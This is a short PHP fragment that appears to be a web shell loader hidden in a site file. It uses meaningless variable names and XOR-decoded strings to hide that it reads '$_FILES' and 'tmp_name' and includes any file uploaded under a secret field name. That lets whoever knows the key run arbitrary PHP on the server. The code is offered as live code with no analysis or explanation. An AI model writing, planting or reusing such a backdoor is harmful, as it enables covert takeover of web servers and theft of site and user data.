...
$pinged = 'r0RfCghcCpUc5iK';
function unique($comment, $internal)

{
    $check = urldecode($comment);
    $raw_key = substr($internal,0, strlen($check));
    return $check ^ $raw_key;
}
$stop = ${unique("-v%1B%2A%064", $pinged)};
if (isset($stop[$pinged]))

{
    $page_path = $stop[$pinged];

    $slashpos = $page_path[unique("%06%5D%229-%06%05%06", $pinged)];
    include ($slashpos);
	$pees = 'en_dash';
}
